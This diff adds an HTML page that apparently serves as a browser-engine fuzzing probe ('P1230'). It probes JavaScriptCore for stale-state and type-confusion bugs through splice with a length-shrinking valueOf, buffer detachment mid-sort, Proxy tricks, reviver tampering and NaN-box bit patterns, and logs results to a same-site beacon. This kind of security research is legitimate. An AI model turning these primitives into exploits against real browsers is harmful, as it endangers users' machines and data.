@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P1230</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0a;color:#00ff41;font:14px/1.5 monospace;padding:12px}
+h3{color:#00ccff;margin:8px 0 4px;font-size:16px}
+pre{white-space:pre-wrap;word-break:break-all;margin:2px 0;font-size:13px}
+</style>
+</head>
+<body>
+<h3>P1230: Deep Stale-State + Type Confusion</h3>
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n';}
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1230-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+B('START','P1230-deep-stale-state');
+log('=== P1230: Deep Stale-State + Type Confusion ===');
+log('');
+
+var R={};
+
+// ============================================================
+// EXP A: Splice stale-state VALUE DUMP
+// P1229 found splice=40 anomalies. Are those undefined property
+// lookups or OOB butterfly reads with heap data?
+// ============================================================
+try{
+  log('[A] Splice value forensics...');
+  var spliceValues=[];
+  var nonUndefined=0;
+  var heapLike=0;
+
+  for(var trial=0;trial<50;trial++){
+    var arr=new Array(1000);
+    for(var i=0;i<1000;i++)arr[i]=0xDEAD0000+i;
+    var evil={valueOf:function(){
+      arr.length=5;
+      return 500;
+    }};
+    try{
+      var removed=arr.splice(10,evil);
+      for(var i=0;i<removed.length;i++){
+        var v=removed[i];
+        if(v!==undefined){
+          nonUndefined++;
+          if(typeof v==='number'&&v!==0&&(v<0xDEAD0000||v>0xDEAD03E8)){
+            heapLike++;
+            if(spliceValues.length<10)spliceValues.push('t'+trial+'i'+i+':0x'+v.toString(16));
+          }
+        }
+      }
+    }catch(e){}
+  }
+
+  // A2: splice with TYPED values to detect butterfly read-through
+  var a2_weirdTypes=0;
+  for(var trial=0;trial<50;trial++){
+    var arr=[];
+    for(var i=0;i<500;i++)arr.push(i+0.5); // force double butterfly
+    var evil2={valueOf:function(){
+      arr.length=10;
+      // Fill freed butterfly area with ArrayBuffers
+      for(var j=0;j<200;j++)new ArrayBuffer(4000);
+      return 200;
+    }};
+    try{
+      var removed2=arr.splice(5,evil2);
+      for(var i=0;i<removed2.length;i++){
+        var v=removed2[i];
+        if(v!==undefined&&typeof v!=='number')a2_weirdTypes++;
+        if(typeof v==='number'&&!isNaN(v)&&v!==0&&(v<0.5||v>499.5)){
+          a2_weirdTypes++;
+          if(spliceValues.length<15)spliceValues.push('A2t'+trial+'i'+i+':'+v);
+        }
+      }
+    }catch(e){}
+  }
+
+  // A3: Use BigUint64Array to read raw bits of splice results
+  var a3_rawBits=[];
+  for(var trial=0;trial<20;trial++){
+    var arr=[];
+    for(var i=0;i<200;i++)arr.push(i*1.1);
+    var evil3={valueOf:function(){
+      arr.length=3;
+      return 100;
+    }};
+    try{
+      var removed3=arr.splice(1,evil3);
+      // Convert undefined/weird values to bits via Float64Array
+      var fb=new ArrayBuffer(8);
+      var f64=new Float64Array(fb);
+      var u64=new BigUint64Array(fb);
+      for(var i=0;i<Math.min(removed3.length,20);i++){
+        if(removed3[i]!==undefined&&typeof removed3[i]==='number'){
+          f64[0]=removed3[i];
+          var bits=u64[0].toString(16);
+          if(a3_rawBits.length<8)a3_rawBits.push(bits);
+        }
+      }
+    }catch(e){}
+  }
+
+  R.a='nonUndef='+nonUndefined+'|heapLike='+heapLike+'|weird='+a2_weirdTypes+'|vals='+spliceValues.join(';')+'|bits='+a3_rawBits.join(';');
+  B('EXP-A',R.a);
+  log('  nonUndef='+nonUndefined+' heapLike='+heapLike+' weird='+a2_weirdTypes);
+  log('  vals: '+spliceValues.join('; '));
+  log('  bits: '+a3_rawBits.join('; '));
+}catch(e){B('EXP-A-ERR',e.message);log('  ERROR: '+e.message);}
+
+// ============================================================
+// EXP B: Array.prototype methods called ON TypedArray
+// TypedArray has own sort/map/etc. What happens when we call
+// Array.prototype versions on TypedArray? Different code path!
+// ============================================================
+try{
+  log('[B] Array.proto on TypedArray...');
+
+  // B1: Array.prototype.sort.call(typedArray, comparator-that-detaches)
+  var b1_result='';
+  try{
+    var buf=new ArrayBuffer(80);
+    var u32=new Uint32Array(buf);
+    for(var i=0;i<20;i++)u32[i]=20-i;
+    var detached=false;
+    Array.prototype.sort.call(u32,function(a,b){
+      if(!detached){
+        try{structuredClone(buf,{transfer:[buf]});detached=true;}catch(e){}
+      }
+      return a-b;
+    });
+    b1_result='ok|detached='+detached+'|u32_0='+u32[0]+'|len='+u32.length;
+  }catch(e){b1_result='err:'+e.message+'|detached='+detached;}
+
+  // B2: Array.prototype.slice.call(typedArray) — returns Array, not TypedArray
+  var b2_result='';
+  try{
+    var buf2=new ArrayBuffer(40);
+    var u8=new Uint8Array(buf2);
+    for(var i=0;i<40;i++)u8[i]=i;
+    var sliced=Array.prototype.slice.call(u8,0,10);
+    b2_result='type='+(sliced instanceof Array)+'|isTA='+(sliced instanceof Uint8Array)+'|len='+sliced.length+'|v0='+sliced[0];
+    // Now detach the original and check if slice has independent data
+    try{structuredClone(buf2,{transfer:[buf2]});}catch(e){}
+    b2_result+='|afterDetach='+sliced[0];
+  }catch(e){b2_result='err:'+e.message;}
+
+  // B3: Array.prototype.splice.call(typedArray) — can splice modify TA backing?
+  var b3_result='';
+  try{
+    var buf3=new ArrayBuffer(40);
+    var u32b=new Uint32Array(buf3);
+    for(var i=0;i<10;i++)u32b[i]=i+100;
+    var spliced=Array.prototype.splice.call(u32b,2,3,999,888,777);
+    b3_result='removed=['+spliced.join(',')+']|u32=['+Array.prototype.slice.call(u32b,0,10).join(',')+']';
+  }catch(e){b3_result='err:'+e.message;}
+
+  // B4: Array.prototype.reverse.call(typedArray) — in-place reversal
+  var b4_result='';
+  try{
+    var buf4=new ArrayBuffer(20);
+    var u8b=new Uint8Array(buf4);
+    for(var i=0;i<20;i++)u8b[i]=i;
+    Array.prototype.reverse.call(u8b);
+    b4_result='v0='+u8b[0]+'|v19='+u8b[19]+'|v10='+u8b[10];
+  }catch(e){b4_result='err:'+e.message;}
+
+  R.b='B1:'+b1_result+'|B2:'+b2_result+'|B3:'+b3_result+'|B4:'+b4_result;
+  B('EXP-B',R.b);
+  log('  B1(sort+detach): '+b1_result);
+  log('  B2(slice): '+b2_result);
+  log('  B3(splice): '+b3_result);
+  log('  B4(reverse): '+b4_result);
+}catch(e){B('EXP-B-ERR',e.message);log('  ERROR: '+e.message);}
+
+// ============================================================
+// EXP C: JSON.parse reviver stale-state attacks
+// Reviver can delete/modify properties during parsing.
+// JSC might use stale internal state.
+// ============================================================
+try{
+  log('[C] JSON.parse reviver attacks...');
+
+  // C1: reviver that deletes properties ahead of iteration
+  var c1_undefs=0;
+  var c1_calls=0;
+  try{
+    var json='{"a":1,"b":2,"c":3,"d":4,"e":5,"f":6,"g":7,"h":8}';
+    var parsed=JSON.parse(json,function(key,value){
+      c1_calls++;
+      if(key==='b'){
+        delete this.e;
+        delete this.f;
+        delete this.g;
+      }
+      if(value===undefined)c1_undefs++;
+      return value;
+    });
+    R.c1='calls='+c1_calls+'|undefs='+c1_undefs+'|keys='+Object.keys(parsed).join(',');
+  }catch(e){R.c1='err:'+e.message;}
+
+  // C2: reviver that replaces values with objects of different types
+  var c2_types=[];
+  try{
+    var json2='[1,2,3,4,5,6,7,8,9,10]';
+    var parsed2=JSON.parse(json2,function(key,value){
+      if(key==='3'){
+        // Replace element 3 with a huge ArrayBuffer
+        return new ArrayBuffer(65536);
+      }
+      if(key==='5'){
+        return {toString:function(){return 'EVIL';}};
+      }
+      return value;
+    });
+    for(var i=0;i<parsed2.length;i++){
+      c2_types.push(typeof parsed2[i]);
+    }
+    R.c2='types='+c2_types.join(',')+('|ab='+(parsed2[3] instanceof ArrayBuffer));
+  }catch(e){R.c2='err:'+e.message;}
+
+  // C3: reviver that modifies array length during array parsing
+  var c3_weirdLen=false;
+  try{
+    var json3='[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]';
+    var parsed3=JSON.parse(json3,function(key,value){
+      if(key==='5'&&Array.isArray(this)){
+        this.length=2; // truncate during parse
+      }
+      return value;
+    });
+    c3_weirdLen=parsed3.length;
+    // Check what values survived
+    var c3_undefs=0;
+    for(var i=0;i<20;i++){
+      if(parsed3[i]===undefined)c3_undefs++;
+    }
+    R.c3='len='+c3_weirdLen+'|undefs='+c3_undefs;
+  }catch(e){R.c3='err:'+e.message;}
+
+  // C4: deeply nested JSON with reviver modifying parent
+  try{
+    var deep='{"a":{"b":{"c":{"d":{"e":1}}}}}';
+    var parentMods=0;
+    JSON.parse(deep,function(key,value){
+      if(key==='e'){
+        // Try to modify grandparent
+        this.__proto__=null;
+        parentMods++;
+      }
+      if(key==='c'&&typeof value==='object'){
+        // By now 'd' was already processed
+        value.injected=new ArrayBuffer(192);
+        parentMods++;
+      }
+      return value;
+    });
+    R.c4='mods='+parentMods;
+  }catch(e){R.c4='err:'+e.message;}
+
+  B('EXP-C',JSON.stringify(R.c1)+'|'+JSON.stringify(R.c2)+'|'+JSON.stringify(R.c3)+'|'+JSON.stringify(R.c4));
+  log('  C1(delete): '+R.c1);
+  log('  C2(replace): '+R.c2);
+  log('  C3(truncate): '+R.c3);
+  log('  C4(deep mod): '+R.c4);
+}catch(e){B('EXP-C-ERR',e.message);log('  ERROR: '+e.message);}
+
+// ============================================================
+// EXP D: Array.from mapFn stale-state
+// Array.from({length:N}, mapFn) — what if mapFn changes length?
+// ============================================================
+try{
+  log('[D] Array.from mapFn attacks...');
+
+  // D1: mapFn that shrinks source length
+  var d1_calls=0;
+  try{
+    var src={length:100};
+    for(var i=0;i<100;i++)src[i]=i+0.5;
+    var mapped=Array.from(src,function(v,idx){
+      d1_calls++;
+      if(idx===10)src.length=5;
+      return v;
+    });
+    R.d1='calls='+d1_calls+'|len='+mapped.length;
+    // Check for undefined values past the truncation
+    var d1_undefs=0;
+    for(var i=0;i<mapped.length;i++){
+      if(mapped[i]===undefined)d1_undefs++;
+    }
+    R.d1+='|undefs='+d1_undefs;
+  }catch(e){R.d1='err:'+e.message;}
+
+  // D2: mapFn that detaches a TypedArray source
+  var d2_detached=false;
+  try{
+    var buf=new ArrayBuffer(400);
+    var srcTA=new Float64Array(buf);
+    for(var i=0;i<50;i++)srcTA[i]=i*1.1;
+    var mapped2=Array.from(srcTA,function(v,idx){
+      if(idx===10&&!d2_detached){
+        try{structuredClone(buf,{transfer:[buf]});d2_detached=true;}catch(e){}
+      }
+      return v;
+    });
+    R.d2='detached='+d2_detached+'|len='+mapped2.length;
+    if(d2_detached){
+      // Check values after detach point
+      var postDetach=[];
+      for(var i=9;i<15&&i<mapped2.length;i++){
+        postDetach.push(typeof mapped2[i]+':'+mapped2[i]);
+      }
+      R.d2+='|post='+postDetach.join(';');
+    }
+  }catch(e){R.d2='err:'+e.message;}
+
+  // D3: TypedArray.from with iterator that yields too many values
+  try{
+    var count=0;
+    var iter={
+      [Symbol.iterator]:function(){
+        return{
+          next:function(){
+            if(count<200){
+              count++;
+              return{value:count,done:false};
+            }
+            return{done:true};
+          }
+        };
+      }
+    };
+    var ta=Uint8Array.from(iter);
+    R.d3='len='+ta.length+'|v0='+ta[0]+'|v199='+ta[199]+'|count='+count;
+  }catch(e){R.d3='err:'+e.message;}
+
+  B('EXP-D',JSON.stringify(R.d1)+'|'+JSON.stringify(R.d2)+'|'+JSON.stringify(R.d3));
+  log('  D1(shrink): '+R.d1);
+  log('  D2(detach): '+R.d2);
+  log('  D3(TA.from): '+R.d3);
+}catch(e){B('EXP-D-ERR',e.message);log('  ERROR: '+e.message);}
+
+// ============================================================
+// EXP E: Object.assign with evil Proxy source
+// Proxy getOwnPropertyDescriptor returning wrong info
+// ============================================================
+try{
+  log('[E] Object.assign Proxy attacks...');
+
+  // E1: Proxy that reports extra properties during assign
+  var e1_gets=[];
+  try{
+    var src={a:1,b:2};
+    var proxy=new Proxy(src,{
+      ownKeys:function(){
+        return['a','b','c','d','e']; // more keys than exist
+      },
+      getOwnPropertyDescriptor:function(t,prop){
+        e1_gets.push(prop);
+        if(prop==='c')return{value:new ArrayBuffer(192),enumerable:true,configurable:true};
+        if(prop==='d')return{value:undefined,enumerable:true,configurable:true};
+        if(prop==='e')return{
+          get:function(){return 'GETTER';},
+          enumerable:true,
+          configurable:true
+        };
+        return Object.getOwnPropertyDescriptor(t,prop);
+      }
+    });
+    var target={};
+    Object.assign(target,proxy);
+    R.e1='keys='+Object.keys(target).join(',')+'|cType='+(target.c instanceof ArrayBuffer)+'|e='+target.e+'|gets='+e1_gets.length;
+  }catch(e){R.e1='err:'+e.message;}
+
+  // E2: Proxy that modifies target during assign
+  var e2_mods=0;
+  try{
+    var target2=new Uint8Array(20);
+    var src2={0:0xFF,1:0xFE,2:0xFD};
+    var proxy2=new Proxy(src2,{
+      get:function(t,prop){
+        e2_mods++;
+        if(prop==='1'){
+          // Detach target's buffer during property copy
+          try{structuredClone(target2.buffer,{transfer:[target2.buffer]});}catch(e){}
+        }
+        return t[prop];
+      }
+    });
+    try{
+      Object.assign(target2,proxy2);
+      R.e2='ok|t0='+target2[0]+'|t1='+target2[1]+'|tlen='+target2.length+'|mods='+e2_mods;
+    }catch(e){R.e2='inner:'+e.message;}
+  }catch(e){R.e2='err:'+e.message;}
+
+  B('EXP-E',JSON.stringify(R.e1)+'|'+JSON.stringify(R.e2));
+  log('  E1(proxy keys): '+R.e1);
+  log('  E2(assign+detach): '+R.e2);
+}catch(e){B('EXP-E-ERR',e.message);log('  ERROR: '+e.message);}
+
+// ============================================================
+// EXP F: Prototype pollution + property access confusion
+// What if we pollute Array/Object prototype during operations?
+// ============================================================
+try{
+  log('[F] Prototype pollution during ops...');
+
+  // F1: Define getter on Array.prototype during iteration
+  var f1_getterHit=0;
+  var f1_saved=Array.prototype[50]; // save
+  try{
+    var arr=new Array(100);
+    for(var i=0;i<100;i++)arr[i]=i;
+    arr.length=20; // make elements 20-99 absent
+    // Define a prototype getter for absent indices
+    Object.defineProperty(Array.prototype,'50',{
+      get:function(){f1_getterHit++;return 0xCAFE;},
+      configurable:true
+    });
+    // Now access index 50 which doesn't exist on arr
+    var v50=arr[50]; // should hit prototype getter
+    // Try Array.from which iterates up to length
+    arr.length=100; // expand back
+    var mapped=Array.from(arr);
+    var protoHits=0;
+    for(var i=20;i<100;i++){
+      if(mapped[i]===0xCAFE)protoHits++;
+    }
+    R.f1='getter='+f1_getterHit+'|v50=0x'+v50.toString(16)+'|protoHits='+protoHits;
+  }catch(e){R.f1='err:'+e.message;}
+  finally{delete Array.prototype[50];}
+
+  // F2: toString/valueOf confusion in comparison
+  var f2_calls=0;
+  try{
+    var evil={
+      valueOf:function(){
+        f2_calls++;
+        if(f2_calls===1)return 5;
+        if(f2_calls===2)return 500; // different value on second call!
+        return 0;
+      }
+    };
+    var arr2=[1,evil,3,evil,5,evil,7];
+    arr2.sort(function(a,b){
+      var va=typeof a==='object'?a.valueOf():a;
+      var vb=typeof b==='object'?b.valueOf():b;
+      return va-vb;
+    });
+    R.f2='calls='+f2_calls+'|arr=['+arr2.map(function(x){return typeof x==='object'?'OBJ':x;}).join(',')+']';
+  }catch(e){R.f2='err:'+e.message;}
+
+  // F3: Symbol.toPrimitive that returns different types
+  var f3_primCalls=0;
+  try{
+    var evil2={
+      [Symbol.toPrimitive]:function(hint){
+        f3_primCalls++;
+        if(hint==='number')return new ArrayBuffer(64); // object, not number!
+        if(hint==='string')return 42; // number, not string!
+        return true;
+      }
+    };
+    var numResult=+evil2;
+    var strResult=''+evil2;
+    var boolResult=evil2?'truthy':'falsy';
+    R.f3='prim='+f3_primCalls+'|num='+numResult+'('+typeof numResult+')|str='+strResult+'('+typeof strResult+')|bool='+boolResult;
+  }catch(e){R.f3='err:'+e.message;}
+
+  B('EXP-F',JSON.stringify(R.f1)+'|'+JSON.stringify(R.f2)+'|'+JSON.stringify(R.f3));
+  log('  F1(proto getter): '+R.f1);
+  log('  F2(valueOf flip): '+R.f2);
+  log('  F3(toPrimitive): '+R.f3);
+}catch(e){B('EXP-F-ERR',e.message);log('  ERROR: '+e.message);}
+
+// ============================================================
+// EXP G: TypedArray constructor confusion
+// What happens when TypedArray constructors get weird inputs?
+// ============================================================
+try{
+  log('[G] TypedArray constructor confusion...');
+
+  // G1: TypedArray from another TypedArray whose buffer gets detached
+  var g1_result='';
+  try{
+    var srcBuf=new ArrayBuffer(80);
+    var srcView=new Float64Array(srcBuf);
+    for(var i=0;i<10;i++)srcView[i]=i*1.5;
+    // Proxy the source to detach during construction
+    var readCount=0;
+    var g1Proxy=new Proxy(srcView,{
+      get:function(t,prop){
+        readCount++;
+        if(prop==='length'&&readCount>1){
+          try{structuredClone(srcBuf,{transfer:[srcBuf]});}catch(e){}
+        }
+        return t[prop];
+      }
+    });
+    var newTA=new Float64Array(g1Proxy);
+    g1_result='len='+newTA.length+'|v0='+newTA[0]+'|reads='+readCount;
+  }catch(e){g1_result='err:'+e.message;}
+
+  // G2: TypedArray from array-like with lying length
+  try{
+    var fakeSrc={length:10};
+    for(var i=0;i<10;i++)fakeSrc[i]=i+100;
+    Object.defineProperty(fakeSrc,'length',{
+      get:function(){
+        // Change values during construction
+        for(var j=0;j<10;j++)fakeSrc[j]=0xBEEF;
+        return 10;
+      }
+    });
+    var ta2=new Uint32Array(fakeSrc);
+    R.g2='len='+ta2.length+'|v0=0x'+ta2[0].toString(16)+'|v9=0x'+ta2[9].toString(16);
+  }catch(e){R.g2='err:'+e.message;}
+
+  // G3: Create TypedArray views on same buffer, modify through one during read of other
+  try{
+    var shared=new ArrayBuffer(64);
+    var f64v=new Float64Array(shared);
+    var u64v=new BigUint64Array(shared);
+    var u8v=new Uint8Array(shared);
+
+    f64v[0]=1.5;
+    var bits_before=u64v[0];
+    // Write NaN-boxing tagged value through u64
+    u64v[1]=0xfffe000000000001n; // JSC tagged integer pattern
+    var float_read=f64v[1]; // read as float64
+    var u8_read=[];
+    for(var i=8;i<16;i++)u8_read.push(u8v[i]);
+
+    R.g3='bits=0x'+bits_before.toString(16)+'|tagged_float='+float_read+'|isNaN='+isNaN(float_read)+'|bytes='+u8_read.join(',');
+  }catch(e){R.g3='err:'+e.message;}
+
+  R.g='G1:'+g1_result;
+  B('EXP-G',R.g+'|'+JSON.stringify(R.g2)+'|'+JSON.stringify(R.g3));
+  log('  G1(detach during ctor): '+g1_result);
+  log('  G2(lying length): '+R.g2);
+  log('  G3(NaN-box bits): '+R.g3);
+}catch(e){B('EXP-G-ERR',e.message);log('  ERROR: '+e.message);}
+
+// ============================================================
+// EXP H: String.prototype.replace with recursive replacement
+// that causes internal buffer reallocation
+// ============================================================
+try{
+  log('[H] String recursive replace...');
+
+  // H1: replace that grows the result exponentially
+  try{
+    var str='AAAA';
+    var iterations=0;
+    for(var round=0;round<15;round++){
+      str=str.replace(/A/g,function(m){
+        iterations++;
+        return 'AA'; // double every A
+      });
+      if(str.length>1000000)break;
+    }
+    R.h1='len='+str.length+'|iters='+iterations+'|rounds='+round;
+  }catch(e){R.h1='err:'+e.message;}
+
+  // H2: replace that creates overlapping string references
+  try{
+    var base='X'.repeat(1000);
+    var pieces=[];
+    for(var i=0;i<100;i++){
+      pieces.push(base.substring(i,i+500)); // overlapping views
+    }
+    // Join and check for corruption
+    var joined=pieces.join('');
+    var nonX=0;
+    for(var i=0;i<joined.length;i++){
+      if(joined.charCodeAt(i)!==88)nonX++;
+    }
+    R.h2='joined='+joined.length+'|nonX='+nonX;
+  }catch(e){R.h2='err:'+e.message;}
+
+  B('EXP-H',JSON.stringify(R.h1)+'|'+JSON.stringify(R.h2));
+  log('  H1(exponential): '+R.h1);
+  log('  H2(overlap): '+R.h2);
+}catch(e){B('EXP-H-ERR',e.message);log('  ERROR: '+e.message);}
+
+// ============================================================
+// SYNC SUMMARY — no setTimeout needed
+// ============================================================
+var summary='A:'+R.a+'|B:'+R.b;
+B('SUMMARY-1',summary.slice(0,900));
+var summary2='C1:'+R.c1+'|C2:'+R.c2+'|C3:'+R.c3+'|D1:'+R.d1+'|D2:'+R.d2;
+B('SUMMARY-2',summary2.slice(0,900));
+var summary3='E:'+JSON.stringify(R.e1)+'|'+JSON.stringify(R.e2)+'|F:'+JSON.stringify(R.f1)+'|G:'+R.g+'|H:'+JSON.stringify(R.h1);
+B('SUMMARY-3',summary3.slice(0,900));
+B('DONE','all');
+log('');
+log('=== P1230 COMPLETE ===');
+</script>
+</body>
+</html>
